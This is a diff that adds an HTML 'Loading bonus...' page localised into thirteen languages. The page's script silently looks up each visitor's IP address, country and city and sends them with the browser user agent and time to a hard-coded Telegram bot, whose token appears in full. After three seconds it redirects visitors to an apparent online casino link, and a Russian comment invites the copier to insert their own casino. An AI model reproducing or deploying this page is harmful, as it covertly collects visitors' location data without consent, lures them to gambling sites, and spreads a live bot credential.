@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Loading bonus...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #f9f9f9;
+      text-align: center;
+      padding: 50px;
+    }
+    .container {
+      max-width: 400px;
+      margin: auto;
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+      padding: 30px;
+    }
+    .loader {
+      font-size: 48px;
+      margin-bottom: 20px;
+    }
+    .text {
+      font-size: 20px;
+      font-weight: bold;
+    }
+    .subtext {
+      font-size: 16px;
+      color: #666;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="loader">⏳</div>
+    <div class="text" id="main-text">Loading bonus...</div>
+    <div class="subtext" id="sub-text">Please wait</div>
+  </div>
+
+  <script>
+    // 🌍 Локализация с азиатскими языками
+    const translations = {
+      id: {main: "Memuat bonus...", sub: "Harap tunggu"},
+      ru: {main: "Загружаем бонус...", sub: "Пожалуйста, подождите"},
+      es: {main: "Cargando bono...", sub: "Por favor, espera"},
+      fr: {main: "Chargement du bonus...", sub: "Veuillez patienter"},
+      de: {main: "Bonus wird geladen...", sub: "Bitte warten"},
+      vi: {main: "Đang tải thưởng...", sub: "Vui lòng đợi"},
+      en: {main: "Loading bonus...", sub: "Please wait"},
+
+      ja: {main: "ボーナスを読み込み中...", sub: "お待ちください"},
+      ko: {main: "보너스 로딩 중...", sub: "잠시만 기다려 주세요"},
+      zh: {main: "正在加载奖金...", sub: "请稍候"},
+      hi: {main: "बोनस लोड हो रहा है...", sub: "कृपया प्रतीक्षा करें"},
+      th: {main: "กำลังโหลดโบนัส...", sub: "กรุณารอสักครู่"},
+      ar: {main: "جارٍ تحميل المكافأة...", sub: "يرجى الانتظار"}
+    };
+
+    const lang = (navigator.language || navigator.userLanguage || "en").slice(0,2);
+    const t = translations[lang] || translations.en;
+    document.getElementById("main-text").innerText = t.main;
+    document.getElementById("sub-text").innerText = t.sub;
+
+    // 📦 Telegram логгер
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
+      .then(data => {
+        const ua = navigator.userAgent;
+        const msg = `
+🌍 IP: ${data.ip}
+📍 Country: ${data.country_name}
+🏙️ City: ${data.city}
+📱 UA: ${ua}
+🕰️ Time: ${new Date().toLocaleString()}
+        `;
+        fetch('https://api.telegram.org/bot7758069141:AAHHAPWsqzcENsp3ZB-ZK5GiRjQiDsLtw0M/sendMessage?chat_id=7420967818&text=' + encodeURIComponent(msg));
+      });
+
+    // 🔁 Редирект через 3 секунды
+    setTimeout(() => {
+      window.location.href = "https://1wibsp.life/v3/5267/fortune-wheel-aviamasters?p=tatp"; // 👈 замени на своё казино
+    }, 3000);
+  </script>
+</body>
+</html>
